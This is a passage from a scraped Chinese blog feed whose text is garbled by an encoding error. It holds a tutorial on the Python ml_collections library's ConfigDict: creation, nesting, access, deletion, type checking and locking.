<p>å…»æˆå®šæœŸæ€§èƒ½åˆ†æçš„ä¹ æƒ¯ï¼Œå¯ä»¥è®©ä½ çš„ PHP åº”ç”¨åœ¨æµé‡å’Œå¤æ‚åº¦å¢é•¿æ—¶ä¾ç„¶ä¿æŒæ€§èƒ½ç¨³å®šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½ è¿˜æ²¡å—å¤ŸpythonåŸç”Ÿå­—å…¸çš„å†™æ³•å—ï¼Ÿç”¨ml_collectionsè¯•è¯•å§]]></title>    <link>https://juejin.cn/post/7596975035438694409</link>    <guid>https://juejin.cn/post/7596975035438694409</guid>    <pubDate>2026-01-20T03:55:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035438694409" data-draft-id="7596983314806358066" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½ è¿˜æ²¡å—å¤ŸpythonåŸç”Ÿå­—å…¸çš„å†™æ³•å—ï¼Ÿç”¨ml_collectionsè¯•è¯•å§"/> <meta itemprop="keywords" content="Python,æœºå™¨å­¦ä¹ ,æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-01-20T03:55:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èŒ«èŒ«æ­¤ç”Ÿä½•æ‰€æ±‚"/> <meta itemprop="url" content="https://juejin.cn/user/465848663552974"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½ è¿˜æ²¡å—å¤ŸpythonåŸç”Ÿå­—å…¸çš„å†™æ³•å—ï¼Ÿç”¨ml_collectionsè¯•è¯•å§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848663552974/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èŒ«èŒ«æ­¤ç”Ÿä½•æ‰€æ±‚
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:55:27.000Z" title="Tue Jan 20 2026 03:55:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ml_collectionsæ˜¯ä»€ä¹ˆ</h2>
<p>ml_collections æ˜¯ä¸€ä¸ªpythonåº“ï¼Œåˆè¡·è®¾è®¡æ˜¯ä¸“ä¸ºæœºå™¨å­¦ä¹ é…ç½®ã€‚è€Œæˆ‘åœ¨å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼ŒæŠŠå®ƒå½“åšæ¥ä¸€ä¸ªåŸç”Ÿå­—å…¸çš„æ›¿ä»£é¡¹ï¼Œæ„Ÿè§‰å¾ˆå¥½ç”¨ã€‚æœ¬æ–‡ä¸»è¦ä»‹ç»åŸºç¡€çš„ä½¿ç”¨å’Œé”æœºåˆ¶ã€‚</p>
<p>åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fpypi.org%2Fproject%2Fml-collections%2F" target="_blank" title="https://pypi.org/project/ml-collections/" ref="nofollow noopener noreferrer">pypi.org/project/ml-â€¦</a></p>
<p>æ ¸å¿ƒç‰¹æ€§ï¼š</p>
<ul>
<li>å¯ä»¥è®©å­—å…¸ä½¿ç”¨.çš„æ–¹å¼æ¥è®¿é—®å’Œä¿®æ”¹ï¼Œè€ŒåŸç”Ÿæ–¹å¼æ˜¯[""]=xxï¼›</li>
<li>æä¾›äº†é”æœºåˆ¶ï¼Œå½“å†™å®Œå­—å…¸åï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢äº†è¯¯ä¿®æ”¹ï¼›</li>
<li>è‡ªåŠ¨å¸¦äº†æ•°æ®ç±»å‹æ£€æŸ¥ï¼›</li>
</ul>
<h2 data-id="heading-1">äºŒã€åŸºç¡€ç”¨æ³•</h2>
<p>ä¸‹æ–‡ä»£ç æ‰€ç”¨çš„ç‰ˆæœ¬ï¼š1.1.0</p>
<h3 data-id="heading-2">1. åˆ›å»ºæ–¹å¼1ï¼šConfigDict()</h3>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import ConfigDict

<span class="hljs-comment"># ========== æ–¹å¼1ï¼šåˆ›å»ºç©ºçš„ConfigDictï¼Œæœ€åŸºç¡€</span>
<span class="hljs-attr">cfg</span> = ConfigDict()

<span class="hljs-comment"># ========== æ–¹å¼2ï¼šåˆå§‹åŒ–æ—¶ä¼ å…¥åŸç”Ÿå­—å…¸ï¼Œä¸€é”®åˆ›å»º</span>
<span class="hljs-attr">cfg</span> = ConfigDict({
    "lr": 0.001,
    "batch_size": 32,
    "epochs": 100
})

<span class="hljs-comment"># ========== æ–¹å¼3ï¼šç©ºé…ç½®é€æ­¥èµ‹å€¼åˆ›å»º</span>
<span class="hljs-attr">cfg</span> = ConfigDict()
<span class="hljs-comment"># åŸºç¡€å•å±‚é…ç½®èµ‹å€¼</span>
<span class="hljs-attr">cfg.lr</span> = <span class="hljs-number">0.001</span>
<span class="hljs-attr">cfg.batch_size</span> = <span class="hljs-number">32</span>
<span class="hljs-attr">cfg.epochs</span> = <span class="hljs-number">200</span>
<span class="hljs-comment"># é…ç½®æ”¯æŒæ‰€æœ‰PythonåŸºç¡€æ•°æ®ç±»å‹</span>
<span class="hljs-attr">cfg.device</span> = <span class="hljs-string">"cuda"</span>
<span class="hljs-attr">cfg.use_amp</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">cfg.weight_decay</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">5</span>

</code></pre>
<h3 data-id="heading-3">2. åˆ›å»ºæ–¹å¼2ï¼šcreate()ï¼Œå¯ä»¥ä¸€æ¬¡æ€§æŠŠé…ç½®éƒ½å†™å®Œ</h3>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import config_dict

<span class="hljs-comment"># ç”¨ create ä¸€æ¬¡æ€§å†™å®Œæ‰€æœ‰åµŒå¥—é…ç½®</span>
<span class="hljs-attr">cfg</span> = config_dict.create(
    <span class="hljs-comment"># æ•°æ®é›†é…ç½®</span>
    <span class="hljs-attr">data</span>=config_dict.create(
        <span class="hljs-attr">dataset</span>=<span class="hljs-string">"cifar10"</span>,
        <span class="hljs-attr">data_dir</span>=<span class="hljs-string">"./data"</span>,
        <span class="hljs-attr">batch_size</span>=<span class="hljs-number">32</span>,
        <span class="hljs-attr">num_workers</span>=<span class="hljs-number">4</span>
    ),
    <span class="hljs-comment"># æ¨¡å‹é…ç½®</span>
    <span class="hljs-attr">model</span>=config_dict.create(
        <span class="hljs-attr">backbone</span>=<span class="hljs-string">"resnet18"</span>,
        <span class="hljs-attr">num_classes</span>=<span class="hljs-number">10</span>,
        <span class="hljs-attr">dropout</span>=<span class="hljs-number">0.2</span>,
        <span class="hljs-attr">pretrained</span>=<span class="hljs-literal">True</span>
    ),
    <span class="hljs-comment"># è®­ç»ƒé…ç½® + åµŒå¥—çš„ä¼˜åŒ–å™¨å­é…ç½®</span>
    <span class="hljs-attr">train</span>=config_dict.create(
        <span class="hljs-attr">epochs</span>=<span class="hljs-number">200</span>,
        <span class="hljs-attr">lr</span>=<span class="hljs-number">0.001</span>,
        <span class="hljs-attr">optimizer</span>=config_dict.create(
            <span class="hljs-attr">name</span>=<span class="hljs-string">"adam"</span>,
            <span class="hljs-attr">weight_decay</span>=<span class="hljs-number">1</span>e-<span class="hljs-number">5</span>
        )
    )
)


<span class="hljs-comment"># æ‰“å°é…ç½®ï¼ˆå¯é€‰ï¼‰</span>
print("å®éªŒé…ç½®ï¼š", cfg)
</code></pre>
<h3 data-id="heading-4">3. åµŒå¥—</h3>
<p>å­—å…¸çš„å€¼ä¹Ÿå¯ä»¥æ˜¯ConfigDict</p>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import ConfigDict

<span class="hljs-comment"># åˆ›å»ºæ ¹é…ç½®</span>
<span class="hljs-attr">cfg</span> = ConfigDict()

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># ç¬¬ä¸€å±‚ï¼šæ•°æ®é›†ç›¸å…³é…ç½®ï¼ˆåµŒå¥—1å±‚ï¼‰</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.data</span> = ConfigDict()  <span class="hljs-comment"># å…ˆç»™dataèµ‹å€¼ä¸ºä¸€ä¸ªç©ºçš„ConfigDict</span>
<span class="hljs-attr">cfg.data.dataset_name</span> = <span class="hljs-string">"cifar10"</span>  <span class="hljs-comment"># æ•°æ®é›†åç§°</span>
<span class="hljs-attr">cfg.data.data_path</span> = <span class="hljs-string">"./dataset/cifar10"</span>  <span class="hljs-comment"># æ•°æ®å­˜æ”¾è·¯å¾„</span>
<span class="hljs-attr">cfg.data.batch_size</span> = <span class="hljs-number">32</span>  <span class="hljs-comment"># æ‰¹æ¬¡å¤§å°</span>
<span class="hljs-attr">cfg.data.num_workers</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># åŠ è½½æ•°æ®çš„çº¿ç¨‹æ•°</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># ç¬¬ä¸€å±‚ï¼šæ¨¡å‹ç›¸å…³é…ç½®ï¼ˆåµŒå¥—1å±‚ï¼‰</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.model</span> = ConfigDict()
<span class="hljs-attr">cfg.model.backbone</span> = <span class="hljs-string">"resnet18"</span>  <span class="hljs-comment"># æ¨¡å‹éª¨å¹²ç½‘ç»œ</span>
<span class="hljs-attr">cfg.model.num_classes</span> = <span class="hljs-number">10</span>  <span class="hljs-comment"># åˆ†ç±»ä»»åŠ¡çš„ç±»åˆ«æ•°</span>
<span class="hljs-attr">cfg.model.dropout_rate</span> = <span class="hljs-number">0.2</span>  <span class="hljs-comment"># dropoutæ­£åˆ™åŒ–æ¦‚ç‡</span>
<span class="hljs-attr">cfg.model.use_pretrain</span> = <span class="hljs-literal">True</span>  <span class="hljs-comment"># æ˜¯å¦ä½¿ç”¨é¢„è®­ç»ƒæƒé‡</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># ç¬¬ä¸€å±‚ï¼šè®­ç»ƒç›¸å…³é…ç½®ï¼ˆåµŒå¥—2å±‚ï¼‰</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.train</span> = ConfigDict()
<span class="hljs-attr">cfg.train.epochs</span> = <span class="hljs-number">200</span>  <span class="hljs-comment"># è®­ç»ƒæ€»è½®æ•°</span>
<span class="hljs-attr">cfg.train.base_lr</span> = <span class="hljs-number">0.001</span>  <span class="hljs-comment"># åŸºç¡€å­¦ä¹ ç‡</span>
<span class="hljs-comment"># è®­ç»ƒé…ç½®é‡Œå†åµŒå¥—ï¼šä¼˜åŒ–å™¨çš„å­é…ç½®ï¼ˆåµŒå¥—ç¬¬äºŒå±‚ï¼‰</span>
<span class="hljs-attr">cfg.train.optimizer</span> = ConfigDict()
<span class="hljs-attr">cfg.train.optimizer.name</span> = <span class="hljs-string">"adam"</span>  <span class="hljs-comment"># ä¼˜åŒ–å™¨åç§°</span>
<span class="hljs-attr">cfg.train.optimizer.weight_decay</span> = <span class="hljs-number">0.00005</span>  <span class="hljs-comment"># æƒé‡è¡°å‡</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># å–å€¼ï¼šé“¾å¼ç‚¹è¯­æ³•ï¼Œä¸€å±‚ä¸€å±‚è®¿é—®</span>
<span class="hljs-comment"># --------------------------</span>
print("æ•°æ®é›†åç§°ï¼š", cfg.data.dataset_name)
print("æ¨¡å‹éª¨å¹²ç½‘ç»œï¼š", cfg.model.backbone)
print("ä¼˜åŒ–å™¨åç§°ï¼š", cfg.train.optimizer.name)
print("æƒé‡è¡°å‡ç³»æ•°ï¼š", cfg.train.optimizer.weight_decay)
</code></pre>
<h3 data-id="heading-5">4. è¯»å–æ–¹å¼</h3>
<p>åŒæ—¶æ”¯æŒ.å¼å’Œ[]ä¸­æ‹¬å·æ–¹å¼</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

cfg = ConfigDict({
    <span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>,
    <span class="hljs-string">"model"</span>: ConfigDict({<span class="hljs-string">"backbone"</span>:<span class="hljs-string">"resnet18"</span>})
})

<span class="hljs-comment"># ========== æ–¹å¼1ï¼šç‚¹è¯­æ³• è¯»å–</span>
<span class="hljs-built_in">print</span>(cfg.lr)               <span class="hljs-comment"># è¾“å‡ºï¼š0.001</span>
<span class="hljs-built_in">print</span>(cfg.model.backbone)   <span class="hljs-comment"># è¾“å‡ºï¼šresnet18</span>

<span class="hljs-comment"># ========== æ–¹å¼2ï¼šå­—å…¸ä¸­æ‹¬å·è¯­æ³• è¯»å–</span>
<span class="hljs-built_in">print</span>(cfg[<span class="hljs-string">"lr"</span>])            <span class="hljs-comment"># è¾“å‡ºï¼š0.001</span>
<span class="hljs-built_in">print</span>(cfg[<span class="hljs-string">"model"</span>][<span class="hljs-string">"backbone"</span>]) <span class="hljs-comment"># è¾“å‡ºï¼šresnet18</span>
</code></pre>
<h3 data-id="heading-6">5. åˆ é™¤</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

cfg = ConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>, <span class="hljs-string">"epochs"</span>:<span class="hljs-number">200</span>})

<span class="hljs-keyword">del</span> cfg.epochs <span class="hljs-comment"># åˆ é™¤åŸºç¡€å­—æ®µ</span>
<span class="hljs-keyword">del</span> cfg[<span class="hljs-string">"batch_size"</span>] <span class="hljs-comment"># ç”¨å­—å…¸è¯­æ³•åˆ é™¤ï¼Œç­‰ä»·</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆ é™¤åé…ç½®ï¼š"</span>, cfg) <span class="hljs-comment"># è¾“å‡ºï¼šlr: 0.001</span>
</code></pre>
<h3 data-id="heading-7">6. è‡ªåŠ¨ç±»å‹æ ¡éªŒ</h3>
<p>intå¯ä»¥èµ‹å€¼ç»™intï¼Œintå¯ä»¥èµ‹å€¼ç»™floatï¼Œintä¸èƒ½èµ‹å€¼ç»™stringï¼Œstringä¹Ÿä¸èƒ½èµ‹å€¼ç»™int</p>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import config_dict

<span class="hljs-attr">cfg</span> = config_dict.ConfigDict()
<span class="hljs-attr">cfg.float_field</span> = <span class="hljs-number">12.6</span> <span class="hljs-comment"># floatç±»å‹</span>
<span class="hljs-attr">cfg.integer_field</span> = <span class="hljs-number">123</span> <span class="hljs-comment"># intç±»å‹</span>
<span class="hljs-attr">cfg.another_integer_field</span> = <span class="hljs-number">234</span> <span class="hljs-comment"># intç±»å‹</span>
<span class="hljs-attr">cfg.nested</span> = config_dict.ConfigDict()
<span class="hljs-attr">cfg.nested.string_field</span> = <span class="hljs-string">'tom'</span> <span class="hljs-comment"># strç±»å‹</span>

print(cfg.integer_field)  <span class="hljs-comment"># Prints 123.</span>
print(cfg<span class="hljs-section">['integer_field']</span>)  <span class="hljs-comment"># Prints 123 as well.</span>

try:
  <span class="hljs-attr">cfg.integer_field</span> = <span class="hljs-string">'tom'</span>  <span class="hljs-comment"># å°†strèµ‹å€¼ç»™intç±»å‹ï¼ŒæŠ¥é”™</span>
except TypeError as e:
  print(e)

<span class="hljs-attr">cfg.float_field</span> = <span class="hljs-number">12</span>  <span class="hljs-comment"># intå¯ä»¥ç»™floatèµ‹å€¼ï¼Œè‡ªåŠ¨ç±»å‹è½¬æ¢</span>
<span class="hljs-attr">cfg.nested.string_field</span> = u<span class="hljs-string">'bob'</span>  <span class="hljs-comment"># strèµ‹å€¼</span>

print(cfg)
</code></pre>
<h2 data-id="heading-8">ä¸‰ã€é”æœºåˆ¶</h2>
<h3 data-id="heading-9">1. æ–¹å¼1: lock()</h3>
<ul>
<li>lockåï¼Œä¸å¯ä»¥æ–°å¢å­—æ®µï¼Œä¸å¯ä»¥åˆ é™¤å­—æ®µ</li>
<li>lockåï¼Œå¯ä»¥ä¿®æ”¹å·²æœ‰çš„å­—æ®µï¼ŒåŒ…æ‹¬åµŒå¥—é‡Œçš„å­—æ®µ</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

<span class="hljs-comment"># 1. åˆ›å»ºé…ç½®å¹¶åˆå§‹åŒ–ã€å·²æœ‰å­—æ®µã€‘</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
<span class="hljs-comment"># åµŒå¥—é…ç½®</span>
cfg.model = ConfigDict()
cfg.model.dropout = <span class="hljs-number">0.2</span>

<span class="hljs-comment"># 2. æ ¸å¿ƒï¼šæ‰§è¡Œä¸Šé”æ“ä½œ</span>
cfg.lock()

<span class="hljs-comment"># ä¸Šé”å - ä¿®æ”¹ã€å·²æœ‰å­—æ®µã€‘ï¼šæ­£å¸¸ç”Ÿæ•ˆï¼Œæ— æŠ¥é”™ </span>
cfg.lr = <span class="hljs-number">0.0005</span>          <span class="hljs-comment"># ä¿®æ”¹æ ¹å±‚çº§å·²æœ‰å­—æ®µ âœ”ï¸</span>
cfg.batch_size = <span class="hljs-number">64</span>      <span class="hljs-comment"># ä¿®æ”¹æ ¹å±‚çº§å·²æœ‰å­—æ®µ âœ”ï¸</span>
cfg.model.dropout = <span class="hljs-number">0.1</span>  <span class="hljs-comment"># ä¿®æ”¹åµŒå¥—å±‚çº§å·²æœ‰å­—æ®µ âœ”ï¸</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ä¿®æ”¹åçš„å€¼ï¼š"</span>, cfg.lr, cfg.batch_size, cfg.model.dropout)

<span class="hljs-comment">#  ç‰¹æ€§2ï¼šä¸Šé”å - æ–°å¢ã€ä»»ä½•å­—æ®µã€‘ï¼šç›´æ¥æŠ¥é”™</span>
<span class="hljs-keyword">try</span>:
    cfg.epochs = <span class="hljs-number">200</span>     <span class="hljs-comment"># æ–°å¢æ ¹å±‚çº§å­—æ®µ </span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ æ–°å¢æ ¹å­—æ®µæŠ¥é”™ï¼š"</span>, e)

<span class="hljs-keyword">try</span>:
    cfg.model.backbone = <span class="hljs-string">"resnet18"</span>  <span class="hljs-comment"># æ–°å¢åµŒå¥—å±‚çº§å­—æ®µ âŒ</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ æ–°å¢åµŒå¥—å­—æ®µæŠ¥é”™ï¼š"</span>, e)

<span class="hljs-comment"># ç‰¹æ€§3ï¼šä¸Šé”å - åˆ é™¤ã€ä»»ä½•å­—æ®µã€‘ï¼šç›´æ¥æŠ¥é”™ </span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> cfg.lr  <span class="hljs-comment"># åˆ é™¤æ ¹å±‚çº§å·²æœ‰å­—æ®µ âŒ</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ åˆ é™¤æ ¹å­—æ®µæŠ¥é”™ï¼š"</span>, e)

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">del</span> cfg.model.dropout  <span class="hljs-comment"># åˆ é™¤åµŒå¥—å±‚çº§å·²æœ‰å­—æ®µ âŒ</span>
<span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"âŒ åˆ é™¤åµŒå¥—å­—æ®µæŠ¥é”™ï¼š"</span>, e)
</code></pre>
<ul>
<li>åˆ¤æ–­æ˜¯å¦ä¸Šé”</li>
</ul>
<pre><code class="hljs language-vbscript" lang="vbscript">pr<span class="hljs-built_in">int</span>(cfg.is_locked) # ä¸Šé”åè¿”å› <span class="hljs-literal">True</span>ï¼Œè§£é”åè¿”å› <span class="hljs-literal">False</span>
</code></pre>
<ul>
<li>å½»åº•è§£é”</li>
</ul>
<pre><code class="hljs language-scss" lang="scss">cfg<span class="hljs-selector-class">.unlock</span>()
</code></pre>
<ul>
<li>ä¸´æ—¶è§£é”</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

<span class="hljs-comment"># 1. åˆ›å»ºé…ç½® + èµ‹å€¼å·²æœ‰å­—æ®µ</span>
cfg = ConfigDict()
cfg.lr = <span class="hljs-number">0.001</span>
cfg.batch_size = <span class="hljs-number">32</span>
cfg.model = ConfigDict()

<span class="hljs-comment"># 2. ä¸Šé”ï¼ˆæ ¸å¿ƒå‰æï¼‰</span>
cfg.lock()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åˆå§‹ä¸Šé”çŠ¶æ€: <span class="hljs-subst">{cfg.is_locked}</span>"</span>)  <span class="hljs-comment"># True</span>

<span class="hljs-comment"># ä¸´æ—¶è§£é” with cfg.unlocked()</span>
<span class="hljs-comment"># ç‰¹æ€§ï¼šä»£ç å—å†… ä¸´æ—¶è§£é”ï¼Œå¯è‡ªç”± æ–°å¢/ä¿®æ”¹/åˆ é™¤ ä»»ä½•å­—æ®µï¼›ä»£ç å—ç»“æŸ è‡ªåŠ¨é‡æ–°ä¸Šé”ï¼Œæ— éœ€æ‰‹åŠ¨æ“ä½œ</span>
<span class="hljs-keyword">with</span> cfg.unlocked():
    <span class="hljs-comment"># âœ… ä¸´æ—¶ä¿®æ”¹å·²æœ‰å­—æ®µ</span>
    cfg.lr = <span class="hljs-number">0.0005</span>
    cfg.model.dropout = <span class="hljs-number">0.1</span>
    <span class="hljs-comment"># âœ… ä¸´æ—¶æ–°å¢å­—æ®µï¼ˆæ ¹+åµŒå¥—éƒ½å¯ä»¥ï¼‰</span>
    cfg.epochs = <span class="hljs-number">200</span>
    cfg.model.backbone = <span class="hljs-string">"resnet18"</span>
    <span class="hljs-comment"># âœ… ä¸´æ—¶åˆ é™¤å­—æ®µ</span>
    <span class="hljs-keyword">del</span> cfg.batch_size

<span class="hljs-comment"># éªŒè¯ï¼šä»£ç å—ç»“æŸåè‡ªåŠ¨ä¸Šé” + æ“ä½œå…¨éƒ¨ç”Ÿæ•ˆ</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ä¸´æ—¶è§£é”åçŠ¶æ€: <span class="hljs-subst">{cfg.is_locked}</span>"</span>)  <span class="hljs-comment"># True è‡ªåŠ¨ä¸Šé”</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ä¿®æ”¹å: <span class="hljs-subst">{cfg.lr}</span>, <span class="hljs-subst">{cfg.model.dropout}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ–°å¢å: <span class="hljs-subst">{cfg.epochs}</span>, <span class="hljs-subst">{cfg.model.backbone}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"åˆ é™¤åbatch_sizeæ˜¯å¦å­˜åœ¨: <span class="hljs-subst">{<span class="hljs-string">'batch_size'</span> <span class="hljs-keyword">in</span> cfg}</span>"</span>)  <span class="hljs-comment"># False</span>

